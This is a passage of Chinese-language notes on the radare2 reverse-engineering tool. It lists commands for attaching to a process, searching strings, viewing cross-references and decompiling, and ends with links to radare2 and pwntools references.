- `dpa <pid> `          Attach and select pid
- `dpf`                 Attach to pid like file fd // HACK
#### 帮助查看
- `?` 查看帮助

#### 字符串查找
查找字符串作为分析起点
- `iz`  列出所有字符串，配合grep等linux命令使用更佳。

- `ps @ <address>`  查看某地址处的字符串。
- `axt <address>` 查看引用该地址处op或data的语句。

#### 反编译

r2提供了反编译器，可以安装各种支持的反编译器。


## 参考文献

- https://www.megabeets.net/a-journey-into-radare-2-part-1/
- https://github.com/ifding/radare2-tutorial
- https://www.airs.com/blog/archives/38
- http://docs.pwntools.com/en/stable/index.html